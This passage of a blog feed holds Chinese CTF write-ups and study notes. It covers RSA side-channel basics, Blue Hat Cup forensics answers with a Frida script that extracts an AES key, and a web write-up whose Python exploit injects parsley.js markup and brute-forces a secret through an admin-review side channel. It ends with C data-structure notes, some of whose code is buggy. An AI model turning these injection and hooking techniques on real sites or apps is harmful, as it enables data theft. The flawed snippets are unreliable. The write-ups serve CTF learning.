        <content type="html"><![CDATA[<h1 id="RSA侧信道攻击"><a href="#RSA侧信道攻击" class="headerlink" title="RSA侧信道攻击"></a>RSA侧信道攻击</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ol><li>  能量分析攻击（侧信道攻击）是一种能够从密码设备中获取秘密信息的密码攻击方法．</li><li>  与其 他攻击方法不同：这种攻击利用的是密码设备的<strong>能量消耗特征</strong>，而非密码算法的数学特性．</li><li>  能量分析攻击是一种非入侵式攻击，攻击者可以方便地购买实施攻击所需要的设备：所以这种攻击对智能卡之类的密码设备的安全性造成了严重威胁。</li></ol><h2 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h2><ol><li>  攻击者可获取与加解密相关的侧信道信息，例如能量消耗、运算时间、电磁辐射等等。</li></ol><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230926172105.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230926172130.png"></li></ol><h2 id="转载题目"><a href="#转载题目" class="headerlink" title="转载题目"></a>转载题目</h2><ol><li>  <a href="https://blog.zeddyu.info/2020/01/08/36c3-web/#writeupbin">36c3 Web 学习记录 (zeddyu.info)</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝帽杯半决赛wp_电子取证部分</title>
      <link href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"/>
      <url>/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h1 id="大王毕盛——电子取证"><a href="#大王毕盛——电子取证" class="headerlink" title="大王毕盛——电子取证"></a>大王毕盛——电子取证</h1><h2 id="取证1"><a href="#取证1" class="headerlink" title="取证1"></a>取证1</h2><ol><li>  检材数据开始提取是今年什么时候？</li><li>  在logs.txt中，直接找到时间：09-11 17:20</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230916212902.png"></li></ol><h2 id="取证2"><a href="#取证2" class="headerlink" title="取证2"></a>取证2</h2><ol><li>  嫌疑人手机SD卡存储空间一共多少GB？（答案格式： 22.5）</li><li>  logs.txt中显示SD卡总空间24.32GB</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230916213108.png"></li></ol><h2 id="取证3"><a href="#取证3" class="headerlink" title="取证3"></a>取证3</h2><ol><li>  嫌疑人手机设备名称是？（答案格式：adfer）</li><li>  设备名称：sailfish</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230916213135.png"></li></ol><h2 id="取证4"><a href="#取证4" class="headerlink" title="取证4"></a>取证4</h2><ol><li>  嫌疑人手机IMEI是？（答案格式：3843487568726387）</li><li>  取证软件导入华为备份文件夹检材后找到IMEI：352531082716257</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230916213200.png"></li></ol><h2 id="取证5"><a href="#取证5" class="headerlink" title="取证5"></a>取证5</h2><ol><li>  嫌疑人手机通讯录数据存放在那个数据库文件中？（答案格式：call.db）</li><li>  在所有数据库文件中搜索到contacts.db</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230916213229.png"></li></ol><h2 id="取证6"><a href="#取证6" class="headerlink" title="取证6"></a>取证6</h2><ol><li>  嫌疑人手机一共使用过多少个应用？（答案格式：22）</li><li>  在日志中看到一共使用过100个应用，填的100</li></ol><h2 id="取证7"><a href="#取证7" class="headerlink" title="取证7"></a>取证7</h2><ol><li>  测试apk的包名是？（答案格式：con.tencent.com）</li><li>  取证软件中看到apk目录安装名</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230916213405.png"></li></ol><h2 id="取证8"><a href="#取证8" class="headerlink" title="取证8"></a>取证8</h2><ol><li>  测试apk的签名算法是？（答案格式:AES250）</li><li>  jadx反编译后去签名文件找：SHA256withRSA</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230916213442.png"></li></ol><h2 id="取证9"><a href="#取证9" class="headerlink" title="取证9"></a>取证9</h2><ol><li>  测试apk的主入口是？（答案格式：com.tmp.mainactivity）</li><li>  去清单文件找LUANCH，结果为com.example.myapplication.MainActivity</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230916213520.png"></li></ol><h2 id="取证10"><a href="#取证10" class="headerlink" title="取证10"></a>取证10</h2><ol><li>  测试apk一共申请了几个权限？（答案格式：7）</li><li>  取证分析一共三个permission，即三个权限</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230916213602.png"></li></ol><h2 id="取证11"><a href="#取证11" class="headerlink" title="取证11"></a>取证11</h2><ol><li>  测试apk对Calllog.txt文件内的数据进行了什么加密？（答案格式：DES）</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230916213636.png"></li><li>  Base64.encodeToString，即Base64加密</li></ol><h2 id="取证12"><a href="#取证12" class="headerlink" title="取证12"></a>取证12</h2><ol><li>  10086对嫌疑人拨打过几次电话？（答案格式：5）</li><li>  在文件里搜索Calllog.txt,Base64解密</li><li>  找10086的通话记录，发现是2次</li></ol><h2 id="取证13"><a href="#取证13" class="headerlink" title="取证13"></a>取证13</h2><ol><li>  测试apk对短信记录进行了几次加密？（答案格式：5）</li><li>  短信加密的函数中，先进行了AES加密，后进行了Base64加密，因此是2次。</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230916213830.png"></li></ol><h2 id="取证14"><a href="#取证14" class="headerlink" title="取证14"></a>取证14</h2><ol><li><p>  测试apk对短信记录进行加密的秘钥是？（答案格式：slkdjlfslskdnln）</p></li><li><p>  加密密钥是通过JNI调用so层函数得到的，直接使用frida-hook主动调用jni函数获取返回值</p></li><li><pre><code>  function main() &#123;      Java.perform(function () &#123;          var libJniTest_addr = Module.findBaseAddress(&quot;libmyapplication.so&quot;)          console.log(&quot;libJniTest 地址：&quot;, libJniTest_addr);          if (libJniTest_addr) &#123;              var func_sayHello_addr =   Module.findExportByName(&quot;libmyapplication.so&quot;,   &quot;Java_com_example_myapplication_MainActivity_Getkey&quot;);              console.log(&quot;Java_com_jwxdxnx06_myJNI_sayHello 地址：&quot;,   func_sayHello_addr);              // 主动调用              //创建新函数,参数1：函数地址，参数2：返回值类型，参数3：函数参数类型              var func = new NativeFunction(func_sayHello_addr, &#39;pointer&#39;,   [&#39;pointer&#39;])              // 通过Java.vm获得env              var retVal = func(Java.vm.getEnv())              var ret = Java.vm.getEnv().getStringUtfChars(retVal,   null).readCString();              console.log(ret)         &#125;     &#125;)  &#125;  setTimeout(main)</code></pre></li><li><p>  上面为Frida主动调用脚本</p></li></ol><h2 id="取证15"><a href="#取证15" class="headerlink" title="取证15"></a>取证15</h2><ol><li>  嫌疑人在2021年登录支付宝的验证码是？（答案格式：3464）</li><li>  在Cyberchef中先Base64解码，然后做一次AES即可得到结果</li><li>  Key是取证第14题的结果，IV根据init函数可知是AES的结果</li><li>  最后Hex解密得到明文，分析明文发现就一个支付宝验证码：9250</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝帽杯半决赛wp_web部分</title>
      <link href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_web/"/>
      <url>/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_web/</url>
      
        <content type="html"><![CDATA[<h2 id="ArticleShare"><a href="#ArticleShare" class="headerlink" title="ArticleShare"></a>ArticleShare</h2><ol><li><p>  在前端代码中得知：side channel attack</p></li><li><p>  exp如下</p></li></ol>   <pre class="line-numbers language-none"><code class="language-none">import requestsimport timeimport sysdef main(host, port):    s &#x3D; requests.Session()    base_url &#x3D; f&quot;http:&#x2F;&#x2F;&#123;host&#125;:&#123;port&#125;&#x2F;&quot;    res &#x3D; s.get(base_url)    pos &#x3D; res.text.find(&#39;name&#x3D;&quot;c&quot; value&#x3D;&quot;&#39;) + len(&#39;name&#x3D;&quot;c&quot; value&#x3D;&quot;&#39;)    csrftoken &#x3D; res.text[pos:pos+16]    ss &#x3D; &quot;abcdef0123456789&quot;    flag &#x3D; &quot;&quot;    for i in range(16):        for j in ss:            print(&quot;trying&quot;,j)            payload &#x3D; f&#39;&#39;&#39;&lt;form data-parsley-validate&gt;                      &lt;input data-parsley-required                      data-parsley-trigger&#x3D;\&quot;blur\&quot;                      data-parsley-error-message&#x3D;\&quot;&lt;input type&#x3D;button id&#x3D;like&gt;\&quot;                      data-parsley-errors-container&#x3D;\&quot;a[href^&#x3D;\&#39;&#x2F;lookup.php?id&#x3D;&#123;flag + j&#125;\&#39;]\&quot;                      autofocus&gt;                      &lt;&#x2F;form&gt;&#39;&#39;&#39;            data &#x3D; &#123;&#39;c&#39;: csrftoken, &#39;content&#39;: payload&#125;            res &#x3D; s.post(base_url + &quot;add.php&quot;, data&#x3D;data, allow_redirects&#x3D;False)            #print(res.headers)            location &#x3D; res.headers[&#39;Location&#39;]            pos &#x3D; location.find(&#39;id&#x3D;&#39;) + 3            wp &#x3D; location[pos:]            data &#x3D; &#123;&#39;c&#39;: csrftoken, &#39;id&#39;: wp&#125;            res &#x3D; s.post(base_url + &quot;admin.php&quot;, data&#x3D;data)            time.sleep(10)            res &#x3D; s.get(f&quot;http:&#x2F;&#x2F;&#123;host&#125;:&#123;port&#125;&#x2F;lookup.php?id&#x3D;&#123;wp&#125;&quot;)            txt &#x3D; res.text.replace(&quot;\n&quot;, &quot;&quot;).replace(&quot;\r&quot;, &quot;&quot;)            if &quot;Liked by&lt;&#x2F;h3&gt;admin&quot; not in txt:                flag +&#x3D; j                print(i,flag)                breakif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    main(&quot;********&quot;,&quot;*****&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li><p>  如果中间出现没爆出来的就把前面爆出来的几位去掉最后一位，然后添加在flag前面继续爆就行</p></li><li><p>  flag如下</p></li></ol>   <pre class="line-numbers language-none"><code class="language-none">ctf&#123;s1d3_ch4nn3l_attack_is_funny_bluecup2023_got_it&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构</title>
      <link href="/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
      <url>/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h1><ol><li><p>  声明结构体用typedef</p></li><li><p>  静态分配方式用静态数组</p></li><li><p>  length存放顺序表的当前长度</p></li><li><p>  线性表要存放 数据元素 和 顺序表当前长度</p></li><li><p>可以理解为一个数据域：数据元素   和  一个指针域：顺序表当前长度</p>  <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">typedef struct &#123;int data[MaxSize];int length;&#125;SqList;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  结构体变量作函数参数时，用引用</p></li><li><p>初始化线性表时，第一，要把每个元素都赋值为0；第二，要把线性表的长度赋值为0</p>  <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void Init(SqList &amp;L) &#123;for(int i &#x3D; 0;i &lt; MaxSize;i++) &#123;L.data[i] &#x3D; 0;&#125;L.length &#x3D; 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在main函数中的初始化</p>  <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int main(void) &#123;SqList L; &#x2F;&#x2F;初始化一个结构体变量，用类型 名称来写，int a一样InitList(L);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  插入元素，头插法</p></li><li><p>  插入的位置后，从后往前，前一个元素往后挪一个位置，为待插入的元素留出空间</p></li><li><p>  注意下标的起始，线性表从1开始，而数组下标从0开始。操作数 i 是从1开始，存到数组中应该是从 i-1 开始</p></li><li><p>插入元素一共要提供三个参数：<strong>插入的线性表，插入的位置，插入的元素值</strong></p>  <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void ListInsert(SqList &amp;L,int i,int e) &#123;for(int j &#x3D; L.length;j &gt;&#x3D; i;j--) &#123;         &#x2F;&#x2F; 插入第i-1号位置，所以要从i到Length末尾都要后移一位L.data[j] &#x3D; L.data[j-1];&#125;    L.data[i-1] &#x3D; e;    L.length++;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  插入元素应该加上对插入位置的判断</p></li><li><p>合法的插入范围是1-&gt;length+1,即数组中的0-&gt;length; length+1是添加到末尾的后一个位置</p>  <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">bool ListInsert(SqList &amp;L,int i,int e) &#123;if(i &lt; 1 || i &gt; length+1) return false;if(L.length &gt;&#x3D; MaxSize) return false;for(int j &#x3D; L.length;j &gt;&#x3D; i;j--) &#123;L.data[j] &#x3D; L.data[j-1];&#125;L.data[i-1] &#x3D; e;L.length++;return true;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  按值查找，一个一个地比较</p></li><li><p>一定要明确循环的是什么，这个地方循环的是数组下标,而不是线性表的实际位置，从0-&gt;length</p>  <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int LocateElem(SqList &amp;L,int e) &#123;for(int i &#x3D; 0;i &lt; length;i++) &#123;if(L.data[i] &#x3D;&#x3D; e) return i+1; &#x2F;&#x2F; 返回的是线性表中的实际位置，数组下标+1&#125;return -1;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>线性表是随机存取，不需要一个一个地比较，直接根据数组下标去寻找即可</p>  <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int GetElem(SeqList &amp;L,int i) &#123; &#x2F;&#x2F;传入的是线性表的位置return data[i-1]; &#x2F;&#x2F;返回的是数组中的位置对应的数据，要-1&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>线性表元素删除</p>  <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">bool ListDelete(SeqList &amp;L,int i,int &amp;e) &#123;if(i &lt; 1||i &gt; L.length) &#123; &#x2F;&#x2F;给出的删除位置为线性表的位置1-length，而不是数组下标return false; &#x2F;&#x2F; 首先判断要删除的元素是否合法&#125;    e&#x3D;L.data[i-1]; &#x2F;&#x2F;将要被删除的元素赋值给e，后面返回    for(int j &#x3D; i;j &lt; L.length;j++) &#123;        L.data[j-1] &#x3D; L.data[j]; &#x2F;&#x2F;将删除元素后面的元素，从后往前移动    &#125;    L.length--; &#x2F;&#x2F;别忘记修改指针域，即length    return true;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  动态拓展内存空间</p></li><li><p>  初始化动态空间的线性表时，用malloc</p></li><li><p>  malloc返回的是一个指针，指向了多大的内存空间的地址</p></li><li><p>malloc返回的内存空间指针指向线性表的数据域</p>  <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#define InitSize 10typedef struct &#123;int *data; &#x2F;&#x2F;数据域用指针int MaxSize;int length;&#125;SeqList;void InitList(SeqList &amp;L) &#123;L.data&#x3D;(int*)malloc(InitSize*sizeof(int)); &#x2F;&#x2F; malloc的参数是，多少个元素*每个元素的大小    L.length &#x3D; 0;    L.MaxSize &#x3D; InitSize;&#125;void IncreaseSize(SeqList &amp;L,int len) &#123; &#x2F;&#x2F; 传入两个参数，一个是哪个线性表，另一个是拓展多长的内存空间    int *p &#x3D; L.data; &#x2F;&#x2F;扩展内存空间时，先用一个指针指向原有的指针，作为备份    L.data  &#x3D; (int*)malloc((L.MaxSize+len) * sizeof(int));    &#x2F;&#x2F;给L重新申请一段更大的内存空间，相当于清零    for(int i &#x3D; 0;i &lt; L.length;i++) &#123;        L.data[i] &#x3D; p[i]; &#x2F;&#x2F;将原有的p指针指向的内存空间元素依次赋值给新地址L    &#125;    L.MaxSize &#x3D; L.MaxSize + len;    free(p);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h1><h1 id="单链表是next指针，二叉树是左右孩子lchild和rchild"><a href="#单链表是next指针，二叉树是左右孩子lchild和rchild" class="headerlink" title="单链表是next指针，二叉树是左右孩子lchild和rchild"></a>单链表是next指针，二叉树是左右孩子lchild和rchild</h1><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230831124933.png"></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">typedef struct LNode &#123;ElemType data;struct LNode *next;&#125;LNode,*LinkList;&#x2F;&#x2F;相当于typedef struct LNode&#123;&#125; LNode;与typedef struct LNode&#123;&#125; *LinkList;typedef struct LNode LNode;typedef struct LNode *LinkList;typedef struct LNode &#123;    ElemType data;    struct LNode *next;&#125;LNode,*LinkList;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>  LNode * L 与 LinkList L效果相同，都是声明一个指向单链表第一个节点的指针</p></li><li><p>  强调这是一个单链表，用LinkList</p></li><li><p>强调这是一个节点，用LNode *</p>  <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">typedef struct LNode &#123;int data;struct LNode * next;&#125;LNode,*LinkList;typedef struct LNode &#123;int data;struct LNode *next; &#x2F;&#x2F;不要忘记在定义next指针时，用struct关键字，struct LNode *next，定义同类型内部指针时，要带struct,struct LNode* next;&#125;LNode,*LinkList;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>  <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">typedef struct LNode &#123;int data;struct LNode *next;&#125;LNode,*LinkList;&#x2F;&#x2F;初始化一个单链表，带头节点bool InitList(LinkList &amp;L) &#123;    L &#x3D; (LNode *)malloc(sizeof(LNode)); &#x2F;&#x2F; 分配一个头节点    if(L &#x3D;&#x3D; NULL) &#123; &#x2F;&#x2F;如果申请后，L仍为NULL，则内存不足，申请失败        return false;    &#125;    L -&gt; next &#x3D; NULL; &#x2F;&#x2F;头节点之后暂时还没有节点    return true;&#125;bool Empty(LinkList L) &#123;    if(L -&gt; next &#x3D;&#x3D; NULL) return true; &#x2F;&#x2F;头指针指向头节点，如果头指针的下一个为空，则单链表为空    return false;&#125;void test() &#123;    LinkList L;    InitList(L);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  malloc返回的是一个指针，需要强制类型转换为对应指针类型，传入的参数是多少个元素*每个元素的大小</p></li><li><p>  带头节点的单链表 1. 申请一个节点大小的内存空间 2.判断L是否为NULL，内存够不够 3.将头节点的下一个节点地址域指向空 4.如果申请成功，返回true</p></li><li><p>在第i个位置插入元素e</p>  <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">bool ListInsert(LinkList &amp;L,int i,int e) &#123;if(i &lt; 1) return false;LNode *p; &#x2F;&#x2F;指针p指向当前扫描到的节点    int j &#x3D; 0; &#x2F;&#x2F;循环变量，用来判断当前是第几个节点    p &#x3D; L; &#x2F;&#x2F;初始状态下，L指向头节点，头节点是第0个节点    while(p!&#x3D;NULL &amp;&amp; j &lt; i-1) &#123; &#x2F;&#x2F;p不是空，说明没循环到末尾，j&lt;i-1说明还没有循环到第i-1个位置        p &#x3D; p-&gt;next;        j++;    &#125;    if(p &#x3D;&#x3D; NULL) &#123; &#x2F;&#x2F;循环到末尾也没有找到，返回false        return false;    &#125;    LNode *s &#x3D; (LNode *)malloc(sizeof(LNode)); &#x2F;&#x2F;重新开辟一个节点的内存大小,申请的是节点的指针    s -&gt; data &#x3D; e;    s -&gt; next &#x3D; p -&gt; next;    p -&gt; next &#x3D; s;    return true;&#125;&#x2F;&#x2F; 1.判断插入位置是否合法&#x2F;&#x2F; 2.声明循环指针p指向当前扫描到的节点，循环变量j判断当前是第几个节点，这里p强调是一个节点，所以用LNode *&#x2F;&#x2F; 3.初始状态下，循环指针p指向头指针&#x2F;&#x2F; 4.循环指针后移，直到移动到循环变量j和i-1相等且没到末尾&#x2F;&#x2F; 5.循环到末尾也没找到，p&#x3D;&#x3D;NULL,返回false&#x2F;&#x2F; 6.申请一个节点大小的内存单元s，申请的是节点的指针&#x2F;&#x2F; 7.改变s和p指针的指向关系&#x2F;&#x2F; 8.成功返回true&#x2F;&#x2F;单链表的插入操作，需要一个循环变量计数和一个循环指针，去找到应该循环d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  p指针后移： p = p-&gt; next; 下一个指针的地址域赋给上一个，令上一个节点后移一个单位</p></li><li><p>删除节点：首先要找到第i-1个节点，将其指针指向第i+1个节点，并释放第i个节点 </p>  <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">bool ListDelete(LinkList &amp;L,int i,ElemType e) &#123;if(i &lt; 1) return false;    LNode *p;    int j &#x3D; 0;    p &#x3D; L;    while(p !&#x3D; NULL &amp;&amp; j &lt; i-1) &#123; &#x2F;&#x2F;删除第i-1后面的第i号节点的位置        p &#x3D; p -&gt; next;        j++;    &#125;    if(p &#x3D;&#x3D; NULL) &#123;        return false;    &#125;    if(p -&gt; next &#x3D;&#x3D; NULL) &#123; &#x2F;&#x2F;第i-1号节点后面再无节点        return false;    &#125;    LNode *q &#x3D; p -&gt; next; &#x2F;&#x2F;令指针q指向被删除节点，p循环到删除节点的上一个节点    e &#x3D; q -&gt; data;    p-&gt;next &#x3D; q -&gt; next;    free(q);    return true;&#125;&#x2F;&#x2F; 1. 找位置&#x2F;&#x2F; 2. 改节点，将被删除节点的上一个节点的next指针指向被删除节点的next&#x2F;&#x2F; 3. 释放内存，将被删除节点的内存释放掉<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>单链表求长度</p>  <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int length(LinkList &amp;L) &#123;int len &#x3D; 0;LNode *p &#x3D; L; &#x2F;&#x2F;将循环指针p指向头节点Lwhile(p -&gt; next !&#x3D; NULL) &#123; &#x2F;&#x2F;带头节点，头节点不算入长度的话p &#x3D; p -&gt; next;        len ++;&#125;    return len;&#125;int length(LinkList &amp;L) &#123;    int len &#x3D; 0;    LNode *p &#x3D; L -&gt; next; &#x2F;&#x2F;跳过头节点    while(p !&#x3D; NULL) &#123;        p &#x3D; p -&gt; next;    &#125;    return len;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  尾插法建立单链表</p></li></ol><pre><code> <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">LinkList List_TailInsert(LinkList &amp;L) &#123;int x;L &#x3D; (LinkList)malloc(sizeof(LNode));    LNode *s,*r &#x3D; L;    scanf(&quot;%d&quot;,&amp;x);    while(x !&#x3D; 9999) &#123;        s &#x3D; (LNode*)malloc(sizeof(LNode));        s -&gt; data &#x3D; x;        r -&gt; next &#x3D; s;        r &#x3D; s;        scanf(&quot;%d&quot;,&amp;x);    &#125;r -&gt; next &#x3D; NULL;    return L;&#125;&#x2F;&#x2F; 后插操作&#x2F;&#x2F; 1. 将指针r指向要插入节点的上一个位置&#x2F;&#x2F; 2. 申请插入节点s并赋值&#x2F;&#x2F; 3. r的next指针指向s&#x2F;&#x2F; 4. r后移一步指向s，为下一步的操作做准备&#x2F;&#x2F; 最后将最后一个节点的nextz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></code></pre><h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><h2 id="顺序存储"><a href="#顺序存储" class="headerlink" title="顺序存储"></a>顺序存储</h2><ol><li>  几个常考的基本操作</li><li>  i的左孩子</li><li>  i的右孩子</li><li>  i的父节点</li><li>  i所在的层次</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230831152119.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230831152241.png"></li><li>  二叉树的顺序存储中，一定要把二叉树的节点编号和完全二叉树一一对应起来</li></ol><h2 id="链式存储"><a href="#链式存储" class="headerlink" title="链式存储"></a>链式存储</h2><h3 id="二叉链表"><a href="#二叉链表" class="headerlink" title="二叉链表"></a>二叉链表</h3><ol><li>  找到节点p的左右孩子节点时间复杂度低</li><li>  但是找某个节点的父节点，只能从根节点开始遍历</li></ol> <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">struct ElemType &#123;    int value;&#125;typedef struct BiTNode &#123;    ElemType data; &#x2F;&#x2F;数据域    struct BiTNode *lchild,*rchild; &#x2F;&#x2F;指针域&#125;BiTNode,*BiTree; &#x2F;&#x2F;节点和树根节点的指针&#x2F;&#x2F;BiTNode* 和 BiTree等价，但是侧重方面不同&#x2F;&#x2F;定义一棵空树&#x2F;&#x2F;声明一个指向根节点的指针，初始为NULLBiTree root &#x3D; NULL;&#x2F;&#x2F;插入根节点root &#x3D; (BiTree)malloc(sizeof(BiTNode));root -&gt; data &#x3D; &#123;1&#125;;root -&gt; lchild &#x3D; NULL;root -&gt; rchild &#x3D; NULL;&#x2F;&#x2F;插入新节点BiTNode *p &#x3D; (BiTNode*)malloc(sizeof(BiTNode));p -&gt; data &#x3D; &#123;2&#125;;p -&gt; lchild &#x3D; NULL;p -&gt; rchild &#x3D; NULL;root -&gt; lchild &#x3D; p; &#x2F;&#x2F;作为根节点的左孩子节点&#x2F;&#x2F;插入新节点：分配一个节点大小的内存空间，给数据域赋值，并修改左右孩子和父指针<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="三叉链表"><a href="#三叉链表" class="headerlink" title="三叉链表"></a>三叉链表</h3><ol><li>  包含左右孩子节点和父节点指针</li><li>  三叉链表的目的是为了方便寻找父节点</li></ol><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">typedef struct BiTNode &#123;    ElemType data;    struct BiTNode *lchild,*rchild;    struct BiTNode *parent;&#125;BiTNode,*BiTree;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="求树的深度"><a href="#求树的深度" class="headerlink" title="求树的深度"></a>求树的深度</h2><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int treeDepth(BiTree T) &#123; &#x2F;&#x2F;接收二叉树的节点作为参数，通常是根节点if(T &#x3D;&#x3D; NULL) &#123; &#x2F;&#x2F;如果传入的节点是NULL，则返回0，因为空树的高度为0return 0;&#125;    &#x2F;&#x2F;if T &#x3D;&#x3D; NULL 一个是判断这棵树是否为空树，另一个是当递归到叶子节点时，可以返回0+1&#x3D;1else &#123;int l &#x3D; treeDepth(T-&gt;lchild);         int r &#x3D; treeDepth(T-&gt;rchild);        &#x2F;&#x2F;是根据左右子树高度的最大值，应该包含根节点，所以应该+1         if(l &gt; r) return l+1;         else return 